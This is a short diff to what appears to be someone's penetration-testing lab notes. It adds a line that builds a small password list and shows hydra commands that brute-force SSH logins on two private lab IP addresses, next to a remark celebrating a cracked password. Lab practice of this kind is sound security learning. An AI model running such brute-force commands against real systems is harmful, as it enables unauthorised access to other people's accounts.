@@ -70,6 +70,8 @@ sudo ssh -p 22  administrator@192.168.174.129
 service apache2 start
 service ssh start
 ALHAMDULLAH !!!! successfully cracked password using hydra
+
+echo admin >>password.txt &&echo sajib >>password.txt && echo toor >>password.txt
 hydra -l administrator -P password.txt -T 20 192.168.174.129 ssh
 hydra -l sajib -P password.txt -T 20 192.168.174.128  ssh
 
